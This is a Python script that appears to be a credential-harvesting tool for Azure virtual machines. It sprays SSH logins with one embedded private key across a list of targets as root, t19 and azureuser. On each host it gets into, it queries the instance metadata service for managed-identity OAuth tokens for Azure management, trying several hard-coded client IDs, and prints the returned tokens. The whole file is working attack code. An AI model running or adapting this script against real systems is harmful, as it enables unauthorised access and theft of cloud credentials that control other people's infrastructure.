import base64, json, os, sys, concurrent.futures as cf
import paramiko
HERE=os.path.dirname(os.path.abspath(__file__))
d=json.load(open(os.path.join(HERE,'targets.json')))
key=paramiko.Ed25519Key.from_private_key_file
import io
def load():
    try:
        return paramiko.Ed25519Key.from_private_key(io.StringIO(base64.b64decode(d['key_b64']).decode()))
    except Exception:
        return paramiko.RSAKey.from_private_key(io.StringIO(base64.b64decode(d['key_b64']).decode()))
K=load()
CIDS=["d6529b06-857c-4e9e-81d0-eee83f0320ab","2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6",""]
def run(ip,user):
    c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        c.connect(ip,username=user,pkey=K,timeout=6,auth_timeout=6,banner_timeout=8,look_for_keys=False,allow_agent=False)
    except Exception as e:
        return (ip,user,type(e).__name__,None)
    out=[]
    for cid in CIDS:
        q="http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
        if cid: q+="&client_id="+cid
        cmd=("hostname; id -un; nvidia-smi -L 2>/dev/null | head -2; "
             "curl -s -m 6 -H Metadata:true '%s'" % q)
        try:
            _,o,e=c.exec_command(cmd,timeout=25)
            out.append((cid,o.read().decode(errors='replace')[:1400]))
        except Exception as e:
            out.append((cid,"EXECERR "+str(e)[:100]))
    c.close()
    return (ip,user,"OK",out)
jobs=[]
for vm,ip in d['targets']:
    for user in ('root','t19','azureuser'):
        jobs.append((vm,ip,user))
res=[]
with cf.ThreadPoolExecutor(24) as ex:
    futs={ex.submit(run,ip,u):(vm,ip,u) for vm,ip,u in jobs}
    for f in cf.as_completed(futs):
        vm,ip,u=futs[f]
        try: r=f.result()
        except Exception as e: r=(ip,u,"EX",None)
        if r[2]=="OK":
            print("===SUCCESS",vm,ip,u,flush=True)
            for cid,o in r[3]:
                print("---CID",cid,flush=True); print(o.replace("\n"," | ")[:1400],flush=True)
        else:
            print("fail",vm,ip,u,r[2],flush=True)
print("DONE")
